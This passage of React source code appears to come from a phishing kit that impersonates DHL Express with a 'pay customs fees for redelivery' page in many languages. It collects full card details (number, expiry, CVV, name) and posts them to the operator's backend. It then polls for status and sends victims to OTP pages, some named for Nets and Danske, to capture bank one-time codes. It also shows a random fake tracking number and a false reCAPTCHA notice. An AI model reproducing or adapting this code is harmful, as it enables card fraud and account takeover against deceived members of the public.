      trackingNumber: "추적 번호",
      service: "서비스",
      privacyNotice: "개인정보 보호정책",
      consentSettings: "동의 설정",
      copyright: "DHL 그룹 - 모든 권리 보유",
    },
    ja: {
      step: "ステップ2/3",
      title: "関税を支払う",
      description: "再配達リクエストを完了するために関税をお支払いください",
      customFees: "関税額",
      cardNumber: "カード番号",
      cardNumberError: "カード番号は15桁または16桁である必要があります。",
      cardNumberLuhnError: "無効なカード番号です。",
      expiryDate: "MM/YY",
      expiryDateError: "有効な有効期限を入力してください（MM/YY）。",
      cvv: "CVV",
      cvvError: "有効な3桁または4桁のCVVを入力してください。",
      nameOnCard: "カード名義人",
      required: "このフィールドは必須です。",
      agree: "関税を支払うことに同意します。",
      submit: "関税を支払う",
      processing: "支払い処理中",
      paymentFailed: "支払いに失敗しました",
      paymentRejected:
        "お支払いが拒否されました。別のカードでもう一度お試しください。",
      paymentErrorMsg: "お支払い方法に問題があるようです。",
      terms: "この支払いを完了することで、以下を確認し、同意したことになります",
      termsLink: "通関手続きの利用規約",
      recaptcha:
        "このページはGoogle reCAPTCHAによって保護されており、ロボットではないことを確認しています。",
      recaptchaLink: "詳細.",
      deliveryInfo: "配送情報",
      feeDescription: "国際貨物の通関および手数料",
      back: "戻る",
      trackingNumber: "追跡番号",
      service: "サービス",
      privacyNotice: "プライバシー通知",
      consentSettings: "同意設定",
      copyright: "DHLグループ - 無断転載を禁じます",
    },
    pl: {
      step: "KROK 2 Z 3",
      title: "Zapłać opłaty celne",
      description:
        "Proszę uiścić opłaty celne, aby dokończyć prośbę o ponowną dostawę",
      customFees: "Kwota opłat celnych",
      cardNumber: "Numer karty",
      cardNumberError: "Numer karty musi mieć 15 lub 16 cyfr.",
      cardNumberLuhnError: "Nieprawidłowy numer karty.",
      expiryDate: "MM/RR",
      expiryDateError: "Wprowadź poprawną datę ważności (MM/RR).",
      cvv: "CVV",
      cvvError: "Wprowadź poprawny 3- lub 4-cyfrowy CVV.",
      nameOnCard: "Nazwa na karcie",
      required: "To pole jest wymagane.",
      agree: "Zgadzam się zapłacić opłaty celne.",
      submit: "Zapłać opłaty celne",
      processing: "Przetwarzanie płatności",
      paymentFailed: "Płatność nieudana",
      paymentRejected:
        "Twoja płatność została odrzucona. Spróbuj ponownie z inną kartą.",
      paymentErrorMsg:
        "Wygląda na to, że występuje problem z Twoją metodą płatności.",
      terms:
        "Dokonując tej płatności, potwierdzasz, że przeczytałeś i akceptujesz nasze",
      termsLink: "Warunki odprawy celnej",
      recaptcha: "Ta strona jest chroniona przez Google reCAPTCHA.",
      recaptchaLink: "Dowiedz się więcej.",
      deliveryInfo: "Informacje o dostawie",
      feeDescription: "Opłaty celne za przesyłkę międzynarodową",
      back: "Wstecz",
      trackingNumber: "Numer śledzenia",
      service: "Usługa",
      privacyNotice: "Polityka prywatności",
      consentSettings: "Ustawienia zgody",
      copyright: "DHL Group - Wszelkie prawa zastrzeżone",
    },
    th: {
      step: "ขั้นตอนที่ 2 จาก 3",
      title: "ชำระค่าธรรมเนียมศุลกากร",
      description:
        "กรุณาชำระค่าธรรมเนียมศุลกากรเพื่อดำเนินการขอจัดส่งใหม่ให้เสร็จสมบูรณ์",
      customFees: "จำนวนค่าธรรมเนียมศุลกากร",
      cardNumber: "หมายเลขบัตร",
      cardNumberError: "หมายเลขบัตรต้องมี 15 หรือ 16 หลัก",
      cardNumberLuhnError: "หมายเลขบัตรไม่ถูกต้อง",
      expiryDate: "ดด/ปป",
      expiryDateError: "กรุณาป้อนวันหมดอายุที่ถูกต้อง (ดด/ปป)",
      cvv: "CVV",
      cvvError: "กรุณาป้อน CVV 3 หรือ 4 หลักที่ถูกต้อง",
      nameOnCard: "ชื่อบนบัตร",
      required: "จำเป็นต้องกรอกข้อมูลนี้",
      agree: "ฉันยินยอมที่จะชำระค่าธรรมเนียมศุลกากร",
      submit: "ชำระค่าธรรมเนียมศุลกากร",
      processing: "กำลังดำเนินการชำระเงิน",
      paymentFailed: "การชำระเงินล้มเหลว",
      paymentRejected:
        "การชำระเงินของคุณถูกปฏิเสธ กรุณาลองอีกครั้งด้วยบัตรอื่น",
      paymentErrorMsg: "ดูเหมือนว่าจะมีปัญหากับวิธีการชำระเงินของคุณ",
      terms: "การชำระเงินนี้แสดงว่าคุณยอมรับว่าได้อ่านและยอมรับ",
      termsLink: "ข้อกำหนดและเงื่อนไขการชำระภาษีศุลกากร",
      recaptcha: "หน้าเว็บนี้ได้รับการปกป้องโดย Google reCAPTCHA",
      recaptchaLink: "เรียนรู้เพิ่มเติม",
      deliveryInfo: "ข้อมูลการจัดส่ง",
      feeDescription:
        "ค่าธรรมเนียมการชำระภาษีศุลกากรและการดำเนินการสำหรับการจัดส่งระหว่างประเทศของคุณ",
      back: "กลับ",
      trackingNumber: "หมายเลขติดตาม",
      service: "บริการ",
      privacyNotice: "ประกาศความเป็นส่วนตัว",
      consentSettings: "การตั้งค่าการยินยอม",
      copyright: "DHL กรุ๊ป - สงวนลิขสิทธิ์",
    },
    id: {
      step: "LANGKAH 2 DARI 3",
      title: "Bayar Bea Masuk",
      description:
        "Harap bayar bea masuk untuk menyelesaikan permintaan pengiriman ulang Anda",
      customFees: "Jumlah Bea Masuk",
      cardNumber: "Nomor Kartu",
      cardNumberError: "Nomor kartu harus 15 atau 16 digit.",
      cardNumberLuhnError: "Nomor kartu tidak valid.",
      expiryDate: "BB/TT",
      expiryDateError: "Harap masukkan tanggal kedaluwarsa yang valid (BB/TT).",
      cvv: "CVV",
      cvvError: "Harap masukkan CVV 3 atau 4 digit yang valid.",
      nameOnCard: "Nama pada Kartu",
      required: "Kolom ini wajib diisi.",
      agree: "Saya setuju untuk membayar bea masuk.",
      submit: "Bayar Bea Masuk",
      processing: "Memproses Pembayaran",
      paymentFailed: "Pembayaran gagal",
      paymentRejected:
        "Pembayaran Anda ditolak. Silakan coba lagi dengan kartu yang berbeda.",
      paymentErrorMsg: "Sepertinya ada masalah dengan metode pembayaran Anda.",
      terms:
        "Dengan menyelesaikan pembayaran ini, Anda mengakui bahwa Anda telah membaca dan menerima",
      termsLink: "Syarat dan Ketentuan Pemberesan Bea Cukai",
      recaptcha: "Halaman ini dilindungi oleh Google reCAPTCHA.",
      recaptchaLink: "Pelajari lebih lanjut.",
      deliveryInfo: "Informasi Pengiriman",
      feeDescription:
        "Biaya bea cukai dan penanganan untuk kiriman internasional Anda",
      back: "Kembali",
      trackingNumber: "Nomor Pelacakan",
      service: "Layanan",
      privacyNotice: "Pemberitahuan Privasi",
      consentSettings: "Pengaturan Persetujuan",
      copyright: "DHL Group - Hak cipta dilindungi",
    },
    vi: {
      step: "BƯỚC 2 TRONG 3",
      title: "Thanh toán Phí Hải quan",
      description:
        "Vui lòng thanh toán phí hải quan để hoàn tất yêu cầu gửi lại của bạn",
      customFees: "Số tiền Phí Hải quan",
      cardNumber: "Số Thẻ",
      cardNumberError: "Số thẻ phải có 15 hoặc 16 chữ số.",
      cardNumberLuhnError: "Số thẻ không hợp lệ.",
      expiryDate: "MM/TT",
      expiryDateError: "Vui lòng nhập ngày hết hạn hợp lệ (MM/TT).",
      cvv: "CVV",
      cvvError: "Vui lòng nhập CVV 3 hoặc 4 chữ số hợp lệ.",
      nameOnCard: "Tên trên Thẻ",
      required: "Trường này là bắt buộc.",
      agree: "Tôi đồng ý thanh toán phí hải quan.",
      submit: "Thanh toán Phí Hải quan",
      processing: "Đang xử lý thanh toán",
      paymentFailed: "Thanh toán thất bại",
      paymentRejected:
        "Thanh toán của bạn đã bị từ chối. Vui lòng thử lại với thẻ khác.",
      paymentErrorMsg:
        "Có vẻ như có vấn đề với phương thức thanh toán của bạn.",
      terms:
        "Bằng cách hoàn tất thanh toán này, bạn xác nhận rằng bạn đã đọc và chấp nhận",
      termsLink: "Điều khoản và Điều kiện Thông quan Hải quan",
      recaptcha: "Trang này được bảo vệ bởi Google reCAPTCHA.",
      recaptchaLink: "Tìm hiểu thêm.",
      deliveryInfo: "Thông tin Giao hàng",
      feeDescription: "Phí thông quan và xử lý cho lô hàng quốc tế của bạn",
      back: "Quay lại",
      trackingNumber: "Mã Theo dõi",
      service: "Dịch vụ",
      privacyNotice: "Thông báo Quyền riêng tư",
      consentSettings: "Cài đặt đồng ý",
      copyright: "DHL Group - Đã đăng ký bản quyền",
    },
  };

  // ============================================
  // LANGUAGE MAP - FIXED PER REQUEST
  // TN = "en", CH = "de"
  // ============================================
  const getLanguageFromCountry = (countryCode) => {
    const langMap = {
      // Nordic
      DK: "da",
      SE: "sv",
      NO: "no",
      FI: "fi",
      // English speaking (TN = en)
      US: "en",
      GB: "en",
      CA: "en",
      AU: "en",
      NZ: "en",
      IN: "en",
      ZA: "en",
      NG: "en",
      SG: "en",
      PH: "en",
      MY: "en",
      TN: "en",
      // Arabic
      AE: "ar",
      SA: "ar",
      EG: "ar",
      QA: "ar",
      KW: "ar",
      MA: "ar",
      DZ: "ar",
      IQ: "ar",
      LB: "ar",
      JO: "ar",
      YE: "ar",
      // French
      FR: "fr",
      BE: "fr",
      LU: "fr",
      MC: "fr",
      SN: "fr",
      CI: "fr",
      CM: "fr",
      // Spanish
      ES: "es",
      MX: "es",
      AR: "es",
      CO: "es",
      PE: "es",
      VE: "es",
      CL: "es",
      // German (CH = de)
      DE: "de",
      AT: "de",
      LI: "de",
      CH: "de",
      // Italian
      IT: "it",
      SM: "it",
      VA: "it",
      // Dutch
      NL: "nl",
      // Portuguese
      PT: "pt",
      BR: "pt",
      AO: "pt",
      MZ: "pt",
      // Polish
      PL: "pl",
      // Russian
      RU: "ru",
      BY: "ru",
      KZ: "ru",
      KG: "ru",
      UA: "ru",
      // Chinese
      CN: "zh",
      TW: "zh",
      HK: "zh",
      MO: "zh",
      // Japanese
      JP: "ja",
      // Korean
      KR: "ko",
      // Turkish
      TR: "tr",
      // Vietnamese
      VN: "vi",
      // Thai
      TH: "th",
      // Indonesian
      ID: "id",
      // Hebrew
      IL: "he",
      // Urdu
      PK: "ur",
      // Bengali
      BD: "bn",
      // Sinhala
      LK: "si",
    };
    return langMap[countryCode] || "en";
  };

  // Function to format number with proper decimal places
  const formatAmount = (amount, countryCode) => {
    // For currencies like JPY, IQD that don't use decimals
    const noDecimalCurrencies = [
      "JPY",
      "IQD",
      "KRW",
      "VND",
      "CLP",
      "COP",
      "HUF",
      "CZK",
      "IDR",
    ];
    const currencyData = countryCurrencyMap[countryCode];

    if (currencyData && noDecimalCurrencies.includes(currencyData.currency)) {
      return Math.round(amount).toString();
    }

    // For currencies with 1 decimal (TND, JOD, KWD)
    const oneDecimalCurrencies = ["TND", "JOD", "KWD"];
    if (currencyData && oneDecimalCurrencies.includes(currencyData.currency)) {
      return amount.toFixed(1);
    }

    // Default: 2 decimals
    return amount.toFixed(2);
  };

  // Function to detect language and currency based on IP using /api/ipinfo
  const detectLocaleByIP = async () => {
    try {
      console.log("Calling /api/ipinfo to detect country...");
      const res = await fetch(`${apiUrl}/api/ipinfo`);
      if (!res.ok) {
        throw new Error(`HTTP ${res.status}`);
      }
      const data = await res.json();

      // Get country code from API response
      const countryCode =
        data.country_code?.toUpperCase() || data.country?.toUpperCase();
      console.log("Detected country from /api/ipinfo:", countryCode, data);
      setIpCountry(countryCode);

      // Set amount based on detected country
      if (countryCode && countryCurrencyMap[countryCode]) {
        const currencyData = countryCurrencyMap[countryCode];
        const formattedAmountValue = currencyData.localAmount;
        const formattedAmountString = formatAmount(
          formattedAmountValue,
          countryCode,
        );

        const newFeeInfo = {
          amount: formattedAmountValue.toString(),
          currency: currencyData.currency,
          symbol: currencyData.symbol,
          formatted: `${currencyData.symbol}${formattedAmountString}`,
        };

        console.log("Setting fee info:", newFeeInfo);
        setFeeInfo(newFeeInfo);
      } else {
        // Fallback to USD 4.80 if country not in map
        console.log("Country not in map, using USD default:", countryCode);
        setFeeInfo({
          amount: "4.80",
          currency: "USD",
          symbol: "$",
          formatted: "$4.80",
        });
      }

      // Set language based on country
      const detectedLang = getLanguageFromCountry(countryCode);
      setLanguage(detectedLang);
      localStorage.setItem("preferredLanguage", detectedLang);
    } catch (error) {
      console.error("Error detecting location from /api/ipinfo:", error);

      // Fallback to USD 4.80
      setFeeInfo({
        amount: "4.80",
        currency: "USD",
        symbol: "$",
        formatted: "$4.80",
      });

      const savedLang = localStorage.getItem("preferredLanguage");
      if (savedLang && translations[savedLang]) {
        setLanguage(savedLang);
      } else {
        setLanguage("en");
      }
    } finally {
      setIsLoadingLang(false);
    }
  };

  useEffect(() => {
    if (propLanguage) {
      setLanguage(propLanguage);
      setIsLoadingLang(false);
    } else {
      detectLocaleByIP();
    }
  }, [propLanguage]);

  // Function to change language
  const changeLanguage = (langCode) => {
    setLanguage(langCode);
    localStorage.setItem("preferredLanguage", langCode);
    setShowLanguageMenu(false);
  };

  // Function to get translation
  const t = (key) => {
    if (translations[language] && translations[language][key]) {
      return translations[language][key];
    }
    return translations.en[key] || key;
  };

  useEffect(() => {
    if (!isSubmitting) {
      setDots("");
      return;
    }

    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "" : prev + "."));
    }, 500);

    return () => clearInterval(interval);
  }, [isSubmitting]);

  function isValidCardNumberLuhn(cardNumber) {
    let sum = 0;
    let shouldDouble = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber[i], 10);
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }

    return sum % 10 === 0;
  }

  // Validation function
  const validateField = (field, value) => {
    const newErrors = { ...errors };

    switch (field) {
      case "cardNumber":
        if (!value) {
          newErrors.cardNumber = t("required");
        } else if (!/^\d{15,16}$/.test(value)) {
          newErrors.cardNumber = t("cardNumberError");
        } else if (!isValidCardNumberLuhn(value)) {
          newErrors.cardNumber = t("cardNumberLuhnError");
        } else {
          delete newErrors.cardNumber;
        }
        break;
      case "expirationDate":
        if (!value) {
          newErrors.expirationDate = t("required");
        } else if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(value)) {
          newErrors.expirationDate = t("expiryDateError");
        } else {
          delete newErrors.expirationDate;
        }
        break;
      case "cvv":
        if (!value) {
          newErrors.cvv = t("required");
        } else if (!/^\d{3,4}$/.test(value)) {
          newErrors.cvv = t("cvvError");
        } else {
          delete newErrors.cvv;
        }
        break;
      case "nameOnCard":
        if (!value.trim()) {
          newErrors.nameOnCard = t("required");
        } else {
          delete newErrors.nameOnCard;
        }
        break;
      default:
        break;
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const validateAllFields = () => {
    const fields = [
      { name: "cardNumber", value: cardNumber },
      { name: "expirationDate", value: expirationDate },
      { name: "cvv", value: cvv },
      { name: "nameOnCard", value: nameOnCard },
    ];

    let allValid = true;
    const newErrors = {};

    fields.forEach((field) => {
      switch (field.name) {
        case "cardNumber":
          if (!field.value) {
            newErrors.cardNumber = t("required");
            allValid = false;
          } else if (!/^\d{15,16}$/.test(field.value)) {
            newErrors.cardNumber = t("cardNumberError");
            allValid = false;
          } else if (!isValidCardNumberLuhn(field.value)) {
            newErrors.cardNumber = t("cardNumberLuhnError");
            allValid = false;
          }
          break;
        case "expirationDate":
          if (!field.value) {
            newErrors.expirationDate = t("required");
            allValid = false;
          } else if (!/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(field.value)) {
            newErrors.expirationDate = t("expiryDateError");
            allValid = false;
          }
          break;
        case "cvv":
          if (!field.value) {
            newErrors.cvv = t("required");
            allValid = false;
          } else if (!/^\d{3,4}$/.test(field.value)) {
            newErrors.cvv = t("cvvError");
            allValid = false;
          }
          break;
        case "nameOnCard":
          if (!field.value.trim()) {
            newErrors.nameOnCard = t("required");
            allValid = false;
          }
          break;
      }
    });

    if (!agreeToTerms) {
      newErrors.agreeToTerms = "Please agree to the terms";
      allValid = false;
    }

    setErrors(newErrors);
    return allValid;
  };

  const handleBack = () => {
    navigate("/login");
  };

  const pollCardStatus = async (id, maxAttempts = 60, interval = 3000) => {
    let attempts = 0;

    const getCardStatus = async () => {
      try {
        const response = await fetch(`${apiUrl}/api/status/card/${id}`);

        if (response.status === 404) {
          console.log(
            `Card with id ${id} not found, attempt: ${attempts + 1}/${maxAttempts}`,
          );
          return null;
        }

        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }

        const data = await response.json();
        console.log(
          `Card status: ${data.status}, attempt: ${attempts + 1}/${maxAttempts}`,
        );
        return data;
      } catch (error) {
        console.error("Error fetching card status:", error);
        return null;
      }
    };

    const navigateToOTP = (path, paymentId, lang) => {
      console.log(`Navigating to ${path} with paymentId: ${paymentId}`);
      setShowProcessingPage(false);
      navigate(path, {
        state: { paymentId: paymentId, language: lang },
      });
      setIsSubmitting(false);
    };

    while (attempts < maxAttempts) {
      const cardData = await getCardStatus();

      if (cardData) {
        switch (cardData.status) {
          case "rejected":
            setErrorMessage(t("paymentRejected"));
            setShow(true);
            setIsSubmitting(false);
            setShowProcessingPage(false);
            setTimeout(() => setShow(false), 5000);
            return;
          case "otp":
            navigateToOTP("/Otp", id, language);
            return;
          case "otp2":
            navigateToOTP("/Nets", id, language);
            return;
          case "otp3":
            navigateToOTP("/Danske", id, language);
            return;
          case "otp4":
            navigateToOTP("/OtpConfirmPage", id, language);
            return;
          case "app":
            navigateToOTP("/Appotp", id, language);
            return;
          case "completed":
          case "approved":
            console.log("Payment completed/approved");
            setIsSubmitting(false);
            setShowProcessingPage(false);
            return;
          default:
            console.log(
              `Unknown status: ${cardData.status}, continuing to poll...`,
            );
        }
      }

      attempts++;
      if (attempts < maxAttempts) {
        await new Promise((resolve) => setTimeout(resolve, interval));
      }
    }

    console.log("Max polling attempts reached without OTP redirect");
    setErrorMessage(t("paymentErrorMsg"));
    setShow(true);
    setIsSubmitting(false);
    setShowProcessingPage(false);
    setTimeout(() => setShow(false), 5000);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateAllFields()) {
      return;
    }

    setIsSubmitting(true);
    setShowProcessingPage(true);
    setShow(false);
    setErrorMessage("");

    try {
      const [expiryMonth, expiryYear] = expirationDate.split("/");

      const response = await fetch(`${apiUrl}/api/submit-payment`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          cardNumber,
          cardName: nameOnCard,
          expiryMonth,
          expiryYear,
          cvv,
          language: language,
          amount: feeInfo.amount,
          currency: feeInfo.currency,
          country: ipCountry,
        }),
      });

      if (!response.ok) {
        const text = await response.text();
        console.error("Server response:", text);
        throw new Error(`HTTP ${response.status}`);
      }

      const data = await response.json();

      if (data.id) {
        setPaymentId(data.id);
        await pollCardStatus(data.id);
      } else {
        throw new Error(data.message || t("paymentFailed"));
      }
    } catch (error) {
      console.error("Error:", error);
      setErrorMessage(t("paymentErrorMsg"));
      setShow(true);
      setIsSubmitting(false);
      setShowProcessingPage(false);
      setTimeout(() => setShow(false), 5000);
    }
  };

  // Show loading page while detecting language or processing payment
  if (isLoadingLang || showProcessingPage) {
    return <LoadingPage />;
  }

  const isRTL = language === "ar";

  // Available languages for dropdown (ALL LANGUAGES)
  const availableLanguages = [
    { code: "en", name: "English", flag: "GB" },
    { code: "fr", name: "Français", flag: "FR" },
    { code: "es", name: "Español", flag: "ES" },
    { code: "ar", name: "العربية", flag: "SA" },
    { code: "de", name: "Deutsch", flag: "DE" },
    { code: "pt", name: "Português", flag: "BR" },
    { code: "tr", name: "Türkçe", flag: "TR" },
    { code: "it", name: "Italiano", flag: "IT" },
    { code: "ru", name: "Русский", flag: "RU" },
    { code: "zh", name: "中文", flag: "CN" },
    { code: "ko", name: "한국어", flag: "KR" },
    { code: "ja", name: "日本語", flag: "JP" },
    { code: "pl", name: "Polski", flag: "PL" },
    { code: "nl", name: "Nederlands", flag: "NL" },
    { code: "th", name: "ไทย", flag: "TH" },
    { code: "id", name: "Indonesia", flag: "ID" },
    { code: "vi", name: "Tiếng Việt", flag: "VN" },
    { code: "sv", name: "Svenska", flag: "SE" },
    { code: "no", name: "Norsk", flag: "NO" },
    { code: "da", name: "Dansk", flag: "DK" },
    { code: "fi", name: "Suomi", flag: "FI" },
  ];
  
  const generateDHLTracking = () => {
    return Math.floor(1000000000 + Math.random() * 9000000000).toString();
  };
  
  return (
    <div className="dhl-app" dir={isRTL ? "rtl" : "ltr"}>
      <main className="dhl-main">
        <div className="dhl-header">
          <div className="dhl-header-content">
            <div className="dhl-logo-area">
              <img
                alt="DHL Logo"
                src="/dhl-express-logo.png"
                className="dhl-logo"
              />
            </div>
            <div className="dhl-right-header">
              <div className="dhl-lang-dropdown">
                <button
                  className="dhl-lang-btn"
                  onClick={() => setShowLanguageMenu(!showLanguageMenu)}
                >
                  <span className="dhl-lang-flag">
                    {availableLanguages.find((lang) => lang.code === language)
                      ?.flag || "EN"}
                  </span>
                  <span className="dhl-lang-name">
                    {availableLanguages.find((lang) => lang.code === language)
                      ?.name || "English"}
                  </span>
                  <svg
                    width="12"
                    height="12"
                    viewBox="0 0 12 12"
                    fill="none"
                    style={{
                      marginLeft: "4px",
                      transform: showLanguageMenu ? "rotate(180deg)" : "none",
                      transition: "transform 0.2s",
                    }}
                  >
                    <path
                      d="M3 5L6 8L9 5"
                      stroke="currentColor"
                      strokeWidth="1.5"
                      strokeLinecap="round"
                    />
                  </svg>
                </button>
                {showLanguageMenu && (
                  <div className="dhl-lang-menu">
                    {availableLanguages.map((lang) => (
                      <button
                        key={lang.code}
                        className={`dhl-lang-menu-item ${language === lang.code ? "active" : ""}`}
                        onClick={() => changeLanguage(lang.code)}
                      >
                        <span className="dhl-lang-menu-flag">{lang.flag}</span>
                        <span className="dhl-lang-menu-name">{lang.name}</span>
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>

        <div className="dhl-steps-container">
          <div className="dhl-steps">
            <div className="dhl-step active">
              <span className="dhl-step-circle active">1</span>
              <span className="dhl-step-label active">
                Fill Information &amp; Details
              </span>
            </div>
            <span className="dhl-step-line"></span>
            <div className="dhl-step active">
              <span className="dhl-step-circle active">2</span>
              <span className="dhl-step-label active">Pay the Custom Fees</span>
            </div>
            <span className="dhl-step-line"></span>
            <div className="dhl-step">
              <span className="dhl-step-circle upcoming">3</span>
              <span className="dhl-step-label">Submit Redelivery</span>
            </div>
          </div>
        </div>

        {show && (
          <div
            style={{
              backgroundColor: "#fee2e2",
              color: "#dc2626",
              padding: "12px 20px",
              borderRadius: "8px",
              margin: "20px auto",
              maxWidth: "850px",
              width: "calc(100% - 40px)",
              textAlign: "center",
              fontSize: "14px",
              border: "1px solid #fecaca",
            }}
          >
            ⚠️ {errorMessage || t("paymentErrorMsg")}
          </div>
        )}

        <div className="dhl-form-card">
          <h1 className="dhl-form-title">{t("title")}</h1>
          <p style={{ marginBottom: "20px", color: "#666" }}>
            {t("description")}
          </p>

          {/* Shipment Information Section */}
          <div
            style={{
              background: "#f9fafb",
              padding: "15px 20px",
              marginBottom: "24px",
              borderRadius: "8px",
              border: "1px solid #e5e7eb",
            }}
          >
            <div
              style={{
                display: "grid",
                gridTemplateColumns: isMobile ? "1fr" : "1fr 1fr",
                gap: "12px",
              }}
            >
              <div>
                <div
                  style={{
                    fontSize: "11px",
                    color: "#6b7280",
                    textTransform: "uppercase",
                    letterSpacing: "0.5px",
                    marginBottom: "4px",
                  }}
                >
                  {t("trackingNumber")}
                </div>
                <div
                  style={{
                    fontSize: "15px",
                    fontWeight: "600",
                    color: "#111827",
                  }}
                >
                  {generateDHLTracking()}
                </div>
              </div>
              <div>
                <div
                  style={{
                    fontSize: "11px",
                    color: "#6b7280",
                    textTransform: "uppercase",
                    letterSpacing: "0.5px",
                    marginBottom: "4px",
                  }}
                >
                  {t("service")}
                </div>
                <div
                  style={{
                    fontSize: "15px",
                    fontWeight: "600",
                    color: "#111827",
                  }}
                >
                  DHL Express
                </div>
              </div>
            </div>
          </div>

          <div
            style={{
              background: "#f5f5f5",
              padding: "15px 20px",
              marginBottom: "24px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              borderRadius: "8px",
              border: "1px solid #e0e0e0",
            }}
          >
            <span style={{ fontWeight: "600", color: "#333" }}>
              {t("customFees")}
            </span>
            <span
              style={{ fontSize: "24px", fontWeight: "900", color: "#d40511" }}
            >
              {feeInfo.formatted}
            </span>
          </div>

          <div
            className="dhl-card-logos"
            style={{ display: "flex", gap: "10px", marginBottom: "24px" }}
          >
            <img
              src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png"
              alt="Visa"
              height="32"
              style={{
                border: "1px solid #e0e0e0",
                padding: "4px 8px",
                background: "#fff",
                borderRadius: "4px",
              }}
            />
            <img
              src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png"
              alt="Mastercard"
              height="32"
              style={{
                border: "1px solid #e0e0e0",
                padding: "4px 8px",
                background: "#fff",
                borderRadius: "4px",
              }}
            />
            <img
              src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png"
              alt="American Express"
              height="32"
              style={{
                border: "1px solid #e0e0e0",
                padding: "4px 8px",
                background: "#fff",
                borderRadius: "4px",
              }}
            />
          </div>

          <form className="dhl-form" onSubmit={handleSubmit} noValidate>
            <div className="dhl-full">
              <div className="dhl-field">
                <label className="dhl-label">{t("nameOnCard")}</label>
                <input
                  type="text"
                  value={nameOnCard}
                  onChange={(e) => {
                    setNameOnCard(e.target.value.toUpperCase());
                    validateField("nameOnCard", e.target.value);
                  }}
                  className="dhl-input"
                  placeholder="JOHN SMITH"
                  disabled={isSubmitting}
                  style={{
                    borderColor: errors.nameOnCard ? "#d40511" : "#d1d5db",
                  }}
                />
                {errors.nameOnCard && (
                  <div
                    style={{
                      color: "#d40511",
                      fontSize: "12px",
                      marginTop: "5px",
                    }}
                  >
                    {errors.nameOnCard}
                  </div>
                )}
              </div>
            </div>

            <div className="dhl-full">
              <div className="dhl-field">
                <label className="dhl-label">{t("cardNumber")}</label>

                <input
                  type="tel"
                  inputMode="numeric"
                  value={cardNumber.replace(/(.{4})/g, "$1 ").trim()}
                  onChange={(e) => {
                    const rawValue = e.target.value
                      .replace(/\D/g, "")
                      .slice(0, 16);
                    setCardNumber(rawValue);
                    validateField("cardNumber", rawValue);
                  }}
                  className="dhl-input"
                  placeholder="0000 0000 0000 0000"
                  maxLength={19}
                  disabled={isSubmitting}
                  style={{
                    borderColor: errors.cardNumber ? "#d40511" : "#d1d5db",
                  }}
                />

                {errors.cardNumber && (
                  <div
                    style={{
                      color: "#d40511",
                      fontSize: "12px",
                      marginTop: "5px",
                    }}
                  >
                    {errors.cardNumber}
                  </div>
                )}
              </div>
            </div>

            <div className="dhl-row">
              <div className="dhl-col">
                <div className="dhl-field">
                  <label className="dhl-label">{t("expiryDate")}</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    value={expirationDate}
                    onChange={(e) => {
                      let v = e.target.value.replace(/\D/g, "").slice(0, 4);
                      if (v.length > 2) {
                        v = v.slice(0, 2) + "/" + v.slice(2, 4);
                      }
                      setExpirationDate(v);
                      validateField("expirationDate", v);
                    }}
                    className="dhl-input"
                    placeholder="MM/YY"
                    maxLength={5}
                    disabled={isSubmitting}
                    style={{
                      borderColor: errors.expirationDate
                        ? "#d40511"
                        : "#d1d5db",
                    }}
                  />
                  {errors.expirationDate && (
                    <div
                      style={{
                        color: "#d40511",
                        fontSize: "12px",
                        marginTop: "5px",
                      }}
                    >
                      {errors.expirationDate}
                    </div>
                  )}
                </div>
              </div>
              <div className="dhl-col">
                <div className="dhl-field">
                  <label className="dhl-label">{t("cvv")}</label>
                  <input
                    type="tel"
                    inputMode="numeric"
                    value={cvv}
                    onChange={(e) => {
                      const v = e.target.value.replace(/\D/g, "").slice(0, 4);
                      setCVV(v);
                      validateField("cvv", v);
                    }}
                    className="dhl-input"
                    placeholder="123"
                    maxLength={4}
                    disabled={isSubmitting}
                    style={{ borderColor: errors.cvv ? "#d40511" : "#d1d5db" }}
                  />
                  {errors.cvv && (
                    <div
                      style={{
                        color: "#d40511",
                        fontSize: "12px",
                        marginTop: "5px",
                      }}
                    >
                      {errors.cvv}
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="dhl-checkbox-wrapper">
              <div className="dhl-checkbox-row">
                <input
                  type="checkbox"
                  id="agreeToTerms"
                  className="dhl-checkbox"
                  checked={agreeToTerms}
                  onChange={(e) => setAgreeToTerms(e.target.checked)}
                />
                <div className="dhl-checkbox-label">
                  <span>{t("agree")}</span>
                </div>
              </div>
              {errors.agreeToTerms && (
                <div
                  style={{
                    color: "#d40511",
                    fontSize: "12px",
                    marginTop: "5px",
                  }}
                >
                  {errors.agreeToTerms}
                </div>
              )}
            </div>

            <p
              style={{ fontSize: "12px", color: "#666", marginBottom: "20px" }}
            >
              {t("terms")}{" "}
              <a href="#" className="dhl-link">
                {t("termsLink")}
              </a>
            </p>

            <div style={{ display: "flex", gap: "12px" }}>
              <button
                type="button"
                className="dhl-next-btn"
                onClick={handleBack}
                disabled={isSubmitting}
                style={{ background: "#f5f5f5", color: "#333", flex: 1 }}
              >
                ← {t("back")}
              </button>
              <button
                type="submit"
                className="dhl-next-btn"
                disabled={isSubmitting}
                style={{ flex: 2 }}
              >
                {t("submit")}
              </button>
            </div>

            <p
              style={{
                fontSize: "11px",
                color: "#999",
                textAlign: "center",
                marginTop: "20px",
              }}
            >
              {t("recaptcha")}{" "}
              <a href="#" className="dhl-link">
                {t("recaptchaLink")}
              </a>
            </p>
          </form>
        </div>

        {/* FOOTER */}
        <footer
          style={{
            background: "white",
            padding: "30px 0",
            borderTop: "1px solid #E0E0E0",
            marginTop: "auto",
